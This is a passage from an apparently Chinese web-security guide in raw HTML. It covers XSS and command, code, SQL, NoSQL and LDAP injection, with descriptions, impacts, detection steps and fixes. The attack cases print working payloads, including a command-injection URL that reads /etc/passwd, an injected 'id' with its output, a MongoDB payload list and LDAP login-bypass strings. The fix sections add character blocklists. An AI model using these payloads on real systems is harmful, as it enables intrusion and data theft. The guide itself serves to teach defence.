attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>x</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span>alert(xss)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">onloda</span><span class="token attr-value"><span class="token punctuation">=</span>alert(xss)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span>javascript:alert(xss)</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>修复建议</strong></p><ul><li><p>拒绝将不受信任的数据放入<code>HTML</code>文档中，验证所有用户输入数据，有效检测攻击；对所有输出数据进行适当的编码，以防止任何已成功注入的脚本在浏览器端运行。</p></li><li><p>将不受信任的数据插入<code>HTML</code>元素内容之前进行<code>HTML</code>转义。在规范中建议使用命名实体进行转义：</p><pre class="line-numbers language-html"><code class="language-html">&amp; --> <span class="token entity" title="&amp;">&amp;amp;</span>&lt; --> <span class="token entity" title="&lt;">&amp;lt;</span>> --> <span class="token entity" title="&gt;">&amp;gt;</span>" --> <span class="token entity" title="&quot;">&amp;quot;</span>' --> <span class="token entity" title="&#x27;">&amp;#x27;</span>/ --> <span class="token entity" title="&#x2F;">&amp;#x2F;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>HTML</code>属性编码转义：除字母数字字符外，请以<code>HTML</code>实体<code>&amp;#xHH;</code>格式转义所有字符，包括空格（<code>HH</code>=十六进制值）。</p></li><li><p><code>URL</code>编码：对<code>URL</code>参数值进行<code>URL</code>编码。<code>URL</code>编码标准，参考 <code>https://www.w3schools.com/tags/ref_urlencode.asp</code>。</p></li><li><p><code>JavaScript</code>编码：除字母数字字符外，请以<code>\uXXXX</code> <code>Unicode</code>转义格式（X =整数）转义所有字符。</p></li><li><p><code>CSS</code>十六进制编码：<code>CSS</code>转义支持<code>\XX</code>和<code>\XXXXXX</code>。如果下一个字符继续转义序列，则使用两个字符转义会导致问题。有两种解决方案（<code>a</code>）在<code>CSS</code>转义符后添加一个空格（<code>CSS</code>解析器将忽略该空格）（<code>b</code>）使用通过零填充该值而可能的全部<code>CSS</code>转义。</p></li><li><p>过滤以下常见字符：</p><pre class="line-numbers language-html"><code class="language-html">|&amp; ; $%@'"\'\"&lt;>()+CR（回车符，ASCII 0x0d）LF（换行，ASCII 0x0a）,\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p><strong>漏洞描述</strong></p><ul><li><p>命令注入是一种攻击，其目标是通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供的数据（表单，<code>cookie</code>，<code>HTTP</code>标头等）传递给系统<code>shell</code>时，可能会发生命令注入攻击。在此攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的权限执行。命令注入攻击很可能主要是由于输入验证不足。</p></li><li><p>系统命令注入（也称为<code>shell</code>注入）是一个<code>Web</code>安全漏洞，它使攻击者可以在运行应用程序的服务器上执行任意系统（<code>OS</code>）命令，并且通常会完全破坏该应用程序及其所有数据。攻击者通常可以利用<code>OS</code>命令注入漏洞来破坏托管基础架构的其他部分，利用信任关系将攻击转移到组织内的其他系统。</p></li></ul><p><strong>漏洞危害</strong></p><ul><li><p>当应用程序将不安全的用户提供的数据（表单，<code>cookie</code>，<code>HTTP</code>标头等）传递给系统shell时，可能会发生命令注入攻击。在此攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的权限执行。</p></li><li><p>攻击者可以执行未经授权的命令，然后可以使用这些命令来禁用目标系统的应用软件，或者读取和修改攻击者没有权限直接访问的数据。</p></li><li><p>成功利用此漏洞会造成：执行未经授权的代码或命令；<code>DoS</code>：崩溃，退出或重新启动；读取/修改文件或目录；读取应用数据；修改申请数据；</p></li></ul><p><strong>攻击案例</strong></p><ul><li><p>命令注入漏洞通常在以下情况下发生：</p><p>数据从不受信任的来源进入应用程序。</p><p>数据是由应用程序作为命令执行的字符串的一部分。</p><p>通过执行命令，应用程序为攻击者提供了攻击者无法拥有的特权或功能。</p></li></ul><p>场景1：在<code>.PHP</code>页面的<code>URL</code>末尾添加分号，后跟操作系统命令，将执行该命令。<code>%3B</code> <code>URL</code>编码并解码为分号。</p><pre class="line-numbers language-http"><code class="language-http">    http://sensitive/something.php?dir=%3Bcat%20/etc/passwd  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>场景2：以下<code>PHP</code>代码段容易受到命令注入攻击： </p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Please specify the name of the file to delete"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&lt;p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"rm $file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>请求和响应是成功攻击的示例：</p><pre class="line-numbers language-http"><code class="language-http">&lt;!--请求--><span class="token header-name keyword">http:</span>//127.0.0.1/delete.php?filename=bob.txt;id&lt;!--响应-->Please specify the name of the file to deleteuid=33(www-data) gid=33(www-data) groups=33(www-data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>检测方法</strong></p><ul><li><p><code>cmd1|cmd2</code>：使用|将使命令2执行成功，而命令1执行成功与否。</p></li><li><p><code>cmd1;cmd2</code>：使用;将使命令2执行成功，而命令1执行成功与否。</p></li><li><p><code>cmd1||cmd2</code> ：仅当命令1执行失败时，才会执行命令2。</p></li><li><p><code>cmd1&amp;&amp;cmd2</code> ：仅当命令1执行成功时，才会执行命令2。</p></li><li><p><code>$(cmd)</code>：例如，<code>echo $(whoami)</code>或<code>$(touch test.sh; echo &#39;ls&#39; &gt; test.sh)</code></p></li><li><p><code>cmd</code>：用于执行特定命令。例如，<code>whoami</code></p></li><li><p><code> &gt;(cmd)</code>： <code>&gt;(ls)</code></p></li><li><p><code>&lt;(cmd)</code>：<code> &lt;(ls)</code></p></li></ul><p><strong>修复建议</strong></p><ul><li><p>需要清理URL和表单数据中的无效字符。可以将字符列入黑名单，但是可能很难想到要针对其进行验证的所有字符。也可能有一些尚未被发现。应该创建仅包含允许的字符或命令列表的白名单，以验证用户输入。此列表应消除错过的角色以及未发现的威胁。</p></li><li><p>可以包括用于命令注入的常规黑名单：</p><pre><code>| ; &amp; $ &gt; &lt; &#39; \ ! &gt;&gt; #</code></pre></li><li><p>对于Windows转义或过滤以下特殊字符：</p><pre><code>( ) &lt; &gt; &amp; * ‘ | = ? ; [ ] ^ ~ ! . ” % @ / \ : + , </code></pre></li><li><p>对于<code>Linux</code>，转义或过滤以下特殊字符：</p><pre><code>&#123; &#125; ( ) &gt; &lt; &amp; * ‘ | = ? ; [ ] $ – # ~ ! . ” % / \ : +`, </code></pre></li></ul><p>审查以下函数</p><p><strong>Java</strong></p><pre class="line-numbers language-java"><code class="language-java">  Runtime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>C/C++</strong></p><pre class="line-numbers language-c"><code class="language-c">  system  exec  ShellExecute  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>Python</strong></p><pre class="line-numbers language-python"><code class="language-python">  <span class="token keyword">exec</span>  eval  os<span class="token punctuation">.</span>system  os<span class="token punctuation">.</span>popen  subprocess<span class="token punctuation">.</span>popen  subprocess<span class="token punctuation">.</span>call  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>PHP</strong></p><pre class="line-numbers language-php"><code class="language-php">  sytem  shell_exec  exec  proc_open  eval  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    （1）尽量不要执行外部的应用程序或命令，严格过滤用户输入的数据，禁止执行非预期系统命令。</p><p>​    （2）使用自定义函数或函数库实现外部应用程序或命令的功能。</p><p>​    （3）在执行<code>system</code>、<code>eval</code>等命令执行功能的函数前，确定参数内容。</p><p>​    （4）使用<code>escapeshellarg</code>函数处理相关参数。<code>Escapeshellarg</code>函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“<code>\’</code>”，双引号“<code>”</code>”会被转义为“<code>\”</code>”，分号“<code>;</code>”会被转义为“<code>\;</code>”，这样<code>escapeshellarg</code>会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。</p><p>​    （5）使用<code>safe_mode_exec_dir</code>执行可执行的文件路径。将<code>php.ini</code>文件中的<code>safe_mode</code>设置为<code>On</code>，然后将允许执行的文件放入一个目录中，并使用<code>safe_mode_exec_dir</code>指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在<code>safe_mode_exec_dir</code>指定的目录中才会允许执行，否则执行将失败。</p><h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p><strong>漏洞描述</strong></p><ul><li><p>用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。代码以目标应用程序的语言注入，并由该语言的服务器端解释器执行——<code>PHP</code>，<code>Python</code>，<code>Java</code>，<code>Perl</code>，<code>Ruby</code>等。</p></li><li><p>代码注入与命令注入的不同之处在于，攻击者仅受注入语言本身的功能的限制。如果攻击者能够将<code>PHP</code>代码注入到应用程序中并执行该代码，则它们仅受<code>PHP</code>能力的限制。命令注入包括利用现有代码来执行命令，通常是在<code>shell</code>上下文中执行。</p></li></ul><p><strong>漏洞危害</strong></p><ul><li><p>通过注入的代码可以访问直接阻止攻击者访问的资源。</p></li><li><p>成功执行代码注入攻击都可能导致数据完整性丧失、机密性丧失，因为注入的代码数据始终与数据调用或写入有关。此外，代码注入通常可以导致执行任意代码。</p></li><li><p>成功执行代码注入可以绕过身份验证。</p></li></ul><p><strong>攻击案例</strong></p><p>场景1：当开发人员使用<code>PHP</code> <code>eval()</code>函数并向其传递攻击者可以修改的不受信任的数据时，可能会注入代码。</p><p>​    下面的示例显示了使用<code>eval()</code>函数的危险方式：</p><pre class="line-numbers language-php"><code class="language-php">  <span class="token variable">$myvar</span> <span class="token operator">=</span> <span class="token string">"varname"</span><span class="token punctuation">;</span>  <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"\$myvar = \$x;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    由于没有输入验证，因此上面的代码容易受到代码注入攻击。</p><p>​    例如：</p><pre class="line-numbers language-http"><code class="language-http">  /index.php?arg=1; phpinfo()  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    在利用此类错误时，攻击者可能想要执行系统命令。在这种情况下，代码注入错误也可以用于命令注入，例如：</p><pre class="line-numbers language-http"><code class="language-http">  /index.php?arg=1; system('id')  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>检测方法</strong></p><ul><li><p>测试<code>PHP</code>注入漏洞</p></li><li><p>使用查询字符串，测试人员可以注入要处理的代码（在此示例中为恶意<code>URL</code>），作为所包含文件的一部分：</p></li></ul><pre class="line-numbers language-http"><code class="language-http">  http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&amp;cmd=uname%20-a  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>恶意<code>URL</code>被接受为<code>PHP</code>页面的参数，该页面稍后将使用包含文件中的值。</li></ul><p><strong>修复建议</strong></p><ul><li><p>验证和清除输入：扫描转义字符应用程序语言和操作系统的其他特殊符号，例如注释标记，行终止字符和命令定界符。如果应用程序只希望使用一组有限的值，请仅接受这些值，例如通过将其列入白名单或有条件地将其放行。</p></li><li><p>避免使用脆弱的评估构造：尽可能避免在原始用户输入上使用<code>eval()</code>和等效函数。使用特定于语言的专用功能来安全处理用户提供的参数。</p></li><li><p>将所有输入数据视为不可信：请注意用户可以为应用程序提供或处理数据的所有位置。除了查询字符串和<code>HTML</code>表单之类的明显注入向量之外，还可以通过特制数据文件，手动修改的<code>cookie</code>和其他方法注入代码。</p></li><li><p>限制解释器：如果您可以控制服务器配置，则可能需要将解释器功能限制为应用程序所需的最低限度，以防止升级为系统命令注入。例如，如果<code>PHP</code>应用程序不使用<code>system()</code>函数，则可以通过在<code>disable_functions</code>指令中对其进行指定来在<code>php.ini</code>文件中禁用该函数。通常禁用的<code>PHP</code>函数包括：<code>exec()</code>，<code>passthru()</code>，<code>shell_exec()</code>，<code>system()</code>，<code>proc_open()</code>，<code>popen()</code>，<code>curl_exec()</code>，<code>curl_multi_exec()</code>，<code>parse_ini_file()</code>和<code>show_source()</code>。</p></li><li><p>检查代码：使用静态代码检查工具扫描与输入验证和不安全评估有关的漏洞。</p></li><li><p>扫描应用程序：使用动态<code>Web</code>漏洞扫描程序以确保应用程序不受各种类型的攻击（包括代码注入）的影响。</p></li></ul><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p><strong>漏洞描述</strong></p><ul><li>通过把<code>SQL</code>命令插入到<code>Web</code>表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的<code>SQL</code>命令。将（恶意的）<code>SQL</code>命令注入到后台数据库引擎执行的能力，它可以通过在<code>Web</code>表单中输入（恶意）<code>SQL</code>语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行<code>SQL</code>语句。 导致敏感信息泄漏、破坏数据库内容和结构、甚至利用数据库本身的扩展功能控制服务器操作系统。</li></ul><p><strong>漏洞危害</strong></p><ul><li>攻击者利用<code>SQL</code>注入漏洞，可以获取数据库中的多种信息(例如：管理员后台密码)，从而脱取数据库中内容(脱库)。在特别情况下，还可以修改数据库内容或者插入内容到数据库，如果数据库权限分配存在问题，或者数据库本身存在缺陷，那么攻击者可以通过<code>SQL</code>注入漏洞直接获取<code>Webshell</code>或者服务器系统权限。</li></ul><p><strong>攻击案例</strong></p><p>场景1：应用程序在下面存在脆弱性的<code>SQL</code>语句的构造中使用不可信数据：</p><pre><code>  String  query = &quot;SELECT * FROM accounts WHERE custID=&#39;&quot; +  request.getParameter(&quot;id&quot;) + &quot;&#39;“; </code></pre><p>场景2：同样的，框架应用的盲目信任，仍然可能导致查询语句的漏洞。（例如：<code>Hibernate</code>查询语言（<code>HQL</code>））：</p><pre class="line-numbers language-sql"><code class="language-sql">  Query HQLQuery <span class="token operator">=</span>  <span class="token keyword">session</span><span class="token punctuation">.</span>createQuery<span class="token punctuation">(</span><span class="token string">"FROM accounts WHERE custID='"</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>  <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    在这两个案例中，攻击者在浏览器中将“<code>id</code>”参数的值修改成： <code>’</code></p><p>​    <code>or’1’=’1</code>。例如：<code>http://example.com/app/accountView?id=&#39; or &#39;1&#39;=&#39;1</code>这样查询语句的意义就变成了从<code>accounts</code>表中返回所有的记录。更危险的攻击可能    导致数据被篡改甚至是存储过程被调用。</p><p><strong>检测方法</strong></p><ul><li><p>提交单引号字符<code>&#39;</code>并查找错误或其他异常。</p></li><li><p>提交一些特定于<code>SQL</code>的语法，以评估入口点的基础（原始）值和其他值，并在所得应用程序响应中寻找系统差异。</p></li><li><p>提交布尔条件，例如<code>OR 1=1</code>并<code>OR 1=2</code>, <code>and</code>在应用程序的响应中寻找差异。</p></li><li><p>提交旨在在<code>SQL</code>查询中执行时触发时间延迟的有效负载，并寻找响应时间的差异。</p></li><li><p>提交旨在在<code>SQL</code>查询中执行时触发带外网络交互的<code>OAST</code>有效负载，并监视所有结果交互。</p></li></ul><p><strong>修复建议</strong></p><ul><li><p>代码层最佳防御<code>SQL</code>注入方案：采用<code>sql</code>语句预编译和绑定变量，是防御<code>sql</code>注入的最佳方法。</p><p>（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到<code>SQL</code>语句中。当前几乎所有的数据库系统都提供了参数化<code>SQL</code>语句执行接口，使用此接口可以非常有效的防止<code>SQL</code>注入攻击。</p><p>（2）对进入数据库的特殊字符（<code>’”&lt;&gt;&amp;*;</code>等）进行转义处理，或编码转换。</p><p>（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。</p><p>（4）数据长度应该严格规定，能在一定程度上防止比较长的<code>SQL</code>注入语句无法正确执行。</p><p>（5）网站每个数据层的编码统一，建议全部使用<code>UTF-8</code>编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p><p>（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</p><p>（7）避免网站显示<code>SQL</code>错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p></li></ul><h3 id="NoSQL注入"><a href="#NoSQL注入" class="headerlink" title="NoSQL注入"></a>NoSQL注入</h3><p><strong>漏洞描述</strong></p><ul><li><p><code>NoSQL</code>数据库调用都写在应用程序的编程语言，一个自定义的<code>API</code>调用，或格式化按照通常的习惯（如<code>XML</code>，<code>JSON</code>，<code>LINQ</code>，等）。针对这些规范的恶意输入可能不会触发主要的应用程序过滤检查。例如，过滤掉常见的<code>HTML</code>特殊字符（例如）“<code>&lt; &gt; &amp; ;</code>”不会阻止针对<code>JSON API</code>的攻击，其中特殊字符包括“<code>/ &#123; &#125; :</code>”。</p></li><li><p>与传统的SQL注入相比，NoSQL注入攻击可能在应用程序的不同区域中执行。在数据库引擎内执行SQL注入的地方，NoSQL变体可以在应用程序层或数据库层内执行，具体取决于所使用的NoSQL API和数据模型。通常，NoSQL注入攻击将在攻击字符串被解析，评估或连接到NoSQL API调用的地方执行。</p></li></ul><p><strong>漏洞危害</strong></p><ul><li><code>NoSQL</code>注入攻击可以在过程语言中而不是在声明性<code>SQL</code>语言中执行，因此其潜在影响要大于传统<code>SQL</code>注入。</li></ul><p><strong>攻击案例</strong></p><p>场景1：如果攻击者能够操纵传递给<code>$where</code>运算符的数据，则该攻击者可以包含任意<code>JavaScript</code>，以将其评估为<code>MongoDB</code>查询的一部分。如果用户输入不经过清理就直接传递到<code>MongoDB</code>查询中，则以下代码中暴露了一个示例漏洞。</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">db</span><span class="token punctuation">.</span>myCollection<span class="token punctuation">.</span>find<span class="token punctuation">(</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; active: true,  $where: function() &amp;#123; return obj.credits - obj.debits &lt; $userInput; &amp;#125; &amp;#125; );;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    与测试其他类型的注入一样，不需要完全利用此漏洞来证明问题。通过注入与目标API语言相关的特殊字符并观察结果，测试人员可以确定应用程序是否正确清    除了输入。例如，在MongoDB中，如果未经过滤传递包含以下任何特殊字符的字符串，则会触发数据库错误。</p><pre class="line-numbers language-sql"><code class="language-sql">' " \ <span class="token punctuation">;</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; &amp;#125;  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    使用普通的<code>SQL</code>注入，类似的漏洞将使攻击者可以执行任意SQL命令-随意公开或处理数据。但是，由于<code>JavaScript</code>是一种功能全面的语言，因此，这不仅使攻    击者可以操纵数据，还可以运行任意代码。例如，一个完整的利用漏洞不仅会在测试时引起错误，还可以使用特殊字符来制作有效的<code>JavaScript</code>。</p><p><strong>检测方法</strong></p><ul><li><p><code>MongoDB NoSQL</code>注入常见测试<code>payloads</code>： </p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token boolean">true</span><span class="token punctuation">,</span> $<span class="token keyword">where</span>: <span class="token string">'1 == 1'</span><span class="token punctuation">,</span> $<span class="token keyword">where</span>: <span class="token string">'1 == 1'</span>$<span class="token keyword">where</span>: <span class="token string">'1 == 1'</span><span class="token string">', $where: '</span><span class="token number">1</span> <span class="token operator">=</span><span class="token operator">=</span> <span class="token number">1</span><span class="token number">1</span><span class="token punctuation">,</span> $<span class="token keyword">where</span>: <span class="token string">'1 == 1'</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; $ne: 1 &amp;#125;</span>'<span class="token punctuation">,</span> $<span class="token operator">or</span>: <span class="token punctuation">[</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125;, &amp;#123; 'a':'a</span>' <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; ], $comment:'successful MongoDB injection'</span><span class="token number">db</span><span class="token punctuation">.</span>injection<span class="token punctuation">.</span><span class="token keyword">insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;success:1&amp;#125;);</span><span class="token number">db</span><span class="token punctuation">.</span>injection<span class="token punctuation">.</span><span class="token keyword">insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;success:1&amp;#125;);return 1;db.stores.mapReduce(function() &amp;#123; &amp;#123; emit(1,1</span><span class="token operator">||</span> <span class="token number">1</span><span class="token operator">=</span><span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">&amp;&amp;</span> this<span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">/</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//+%00</span>' <span class="token operator">&amp;&amp;</span> this<span class="token punctuation">.</span>passwordzz<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">/</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//+%00</span>'<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span>20this<span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">/</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//+%00</span>'<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span>20this<span class="token punctuation">.</span>passwordzz<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">/</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//+%00</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;$gt: ''&amp;#125;</span><span class="token punctuation">[</span>$ne<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">';sleep(5000);'</span><span class="token punctuation">;</span>it<span class="token operator">=</span>new<span class="token operator">%</span>20Date<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">do</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;pt=new%20Date();&amp;#125;while(pt-it&lt;5000);</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在<code>MongoDB</code>中测试<code>NoSQL</code>注入漏洞</p><p><code>MongoDB API</code>需要<code>BSON</code>（二进制<code>JSON</code>）调用，并包括一个安全的<code>BSON</code>查询组装工具。但是，根据<code>MongoDB</code>文档，在几个替代查询参数中允许未序列化的<code>JSON</code>和<code>JavaScript</code>表达式。允许任意<code>JavaScript</code>输入的最常用的<code>API</code>调用是<code>$where</code>运算符。</p><p>由于<code>$where</code>在<code>SQL</code>中，<code>MongoDB</code>运算符通常用作简单的过滤或检查。</p><pre class="line-numbers language-sql"><code class="language-sql">  <span class="token number">db</span><span class="token punctuation">.</span>myCollection<span class="token punctuation">.</span>find<span class="token punctuation">(</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; $where:  "this.credits == this.debits" &amp;#125; );  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p><strong>修复建议</strong></p><ul><li><p>为了避免<code>NoSQL</code>注入，必须始终将用户输入视为不受信任。可以执行以下操作来验证用户输入：</p></li><li><p>使用输入过滤库，例如<code>mongo-sanitize</code>或<code>mongoose</code>。</p></li><li><p>如果找不到适合开发环境的库，请将用户输入转换为期望的类型。例如，将用户名和密码转换为字符串。</p></li><li><p>在<code>MongoDB</code>的情况下，切勿在用户输入中使用<code>where</code>，<code>mapReduce</code>或<code>group</code>运算符，因为这些运算符使攻击者能够注入<code>JavaScript</code>，因此比其他运算符更加危险。</p></li><li><p>为了加强安全性，可以将<code>mongod.conf</code>的<code>javascriptEnabled</code>设置为<code>false</code>。</p></li><li><p>以最低的权限运行应用程序，以便即使被利用，攻击者也无法访问其他资源。</p></li></ul><h3 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h3><p><strong>漏洞描述</strong></p><ul><li><code>LDAP</code>（轻型目录访问协议）注入是一种攻击，用于利用基于<code>Web</code>的应用程序构建基于用户输入的<code>LDAP</code>语句。当应用程序无法正确清理用户输入时，可以使用本地代理修改<code>LDAP</code>语句。这可能导致执行任意命令，例如向未经授权的查询授予权限以及<code>LDAP</code>树中的内容修改。<code>SQL</code>注入中可用的相同高级利用技术可以类似地应用于<code>LDAP</code>注入中。</li></ul><p><strong>漏洞危害</strong></p><ul><li>攻击者可以更改<code>LDAP</code>查询的输入，该输入允许执行未授权的代码或命令，允许读取或修改敏感数据或导致其他意外行为。</li></ul><p><strong>攻击案例</strong></p><p>场景1：以下代码使用用户输入地址数据构造<code>LDAP</code>查询：由于代码无法中和用于构造查询的地址字符串，因此攻击者可以提供包含其他<code>LDAP</code>查询的地址。</p><pre><code>Example Language: Java context = new InitialDirContext(env);String searchFilter = &quot;StreetAddress=&quot; + address;NamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls); </code></pre><p><strong>检测方法</strong></p><p>场景1：搜索过滤器</p><p>​    假设我们一个<code>Web</code>应用的搜索过滤器，如下所示：</p><pre class="line-numbers language-http"><code class="language-http">  searchfilter="(cn="+user+")"  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    可以通过<code>HTTP</code>请求实例化：</p><pre class="line-numbers language-http"><code class="language-http">  http://www.example.com/ldapsearch?user=John  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    如果将值<code>John</code>替换为<code>*</code>，则通过发送请求：</p><pre class="line-numbers language-http"><code class="language-http">  http://www.example.com/ldapsearch?user=*  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    过滤器如下所示：</p><pre class="line-numbers language-http"><code class="language-http">  searchfilter="(cn=*)"  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    匹配具有“<code>cn</code>”属性的每个对象等于任何内容。</p><p>​    如果应用程序容易受到<code>LDAP</code>注入的攻击，它将显示部分或全部用户属性，具体取决于应用程序的执行流程和<code>LDAP</code>连接的用户的权限。</p><p>​    测试人员可以使用试错方法，通过在参数插入“<code>(|&amp;*</code>”和其他字符，以检查错误的应用程序。</p><p>场景2：登录</p><p>​    如果<code>Web</code>应用程序在登录过程中使用<code>LDAP</code>来检查用户凭据，并且容易受到<code>LDAP</code>注入的影响，则可以通过注入始终为真的<code>LDAP</code>查询（以类似于<code>SQL</code>和<code>XPATH</code>注入的方式）来绕过身份验证检查。</p><p>​    假设<code>Web</code>应用程序使用过滤器来匹配<code>LDAP</code>用户/密码对。</p><pre class="line-numbers language-http"><code class="language-http">  searchlogin= "(&amp;(uid="+user+")(userPassword=&amp;#123;MD5&amp;#125;"+base64(pack("H*",md5(pass)))+"))";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    通过使用以下值：</p><pre class="line-numbers language-http"><code class="language-http">  user=*)(uid=*))(|(uid=*  pass=password  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​    搜索过滤器将导致：</p><pre 